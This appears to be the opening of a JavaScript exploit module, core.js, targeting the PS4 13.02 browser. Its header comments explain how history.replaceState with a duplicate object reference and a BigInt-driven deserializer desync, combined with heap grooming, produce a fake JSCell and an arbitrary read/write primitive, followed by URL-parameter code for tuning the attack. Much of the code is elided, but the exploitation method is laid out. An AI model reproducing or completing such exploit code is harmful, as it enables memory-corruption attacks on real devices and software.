// core.js — SSV primitive for PS4 13.02
//
// Exports: establishPrimitive, currentCarrier, releaseFakeCell,
//          fakeCellReleased, carrierHeaderCopy, carrierHomeVector,
//          profile, aimCarrier, restoreCarrier, plausibleAddress,
//          plausibleCell
//
// URL parameters (read at module load):
//   ?k=N         BigInt/object mix for the SSV graph. Default 2.
//                Sweep this to test whether the SSV stream desyncs.
//   ?slots=N     carrier slots (default 9000000)
//   ?g=name:hex  grooming sizes; see _g override block
//
// The exploit shape: history.replaceState with a graph containing a
// duplicate object reference. If the deserializer's reference-tracking
// loses the identity between the two reads, the duplicate is allocated
// fresh; the heap groom places that fresh allocation on a predecessor
// pattern, and the fresh object becomes a fake JSCell with a controlled
// vector pointer. That gives an arbitrary read/write window.
//
...
// K sets the BigInt/object mix in the filler graph. On firmware where the
// deserializer's object-pool counter can run ahead of the serializer's
// (BigInts increment the read side only), enough BigInts push the
// ObjectReference index across the 0x10000 width tier and desync the
// byte stream. K=1 gives no desync, K=2 is the shipping default, and
// K=3,5,7,8 are known to fire it on some builds.
//
// Read from URL so a sweep can be run by editing the query string alone.
const K = (function () {
    try {
...
const CARRIER_SLOTS = (function () {
    try {
        ...
        if (n >= 100000 && n <= 20000000) return n;
    } catch (e) { }
    return 9000000;
})();
